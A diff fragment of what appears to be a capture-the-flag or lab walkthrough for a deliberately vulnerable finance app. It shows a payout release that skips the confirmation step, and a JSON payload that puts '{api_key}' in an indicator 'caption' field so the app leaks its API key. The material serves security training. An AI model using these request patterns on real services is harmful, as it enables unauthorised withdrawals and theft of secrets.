@@ -6,3 +6,10 @@
   * Another without confirm : make another withdraw but now we skip confirm action and release
 `/api/payouts/2/release` -> `{"id":2,"status":"released","amount":2,"message":"Withdrawal released to your bank account.","compliance_reference":"bug{x}"}`
 
+* Hnt : **Can you find the api_key?** : Lab variant: shadyoaks-007
+
+  * In Custom indicator of Forecast `/api/forecast/indicator`
+  * Add `"caption":"{api_key}"`
+    ```text
+    {"stock_id":2,"formula":"(sma(10) + ema(20)) / 2","caption":"{api_key}"}
+    ```
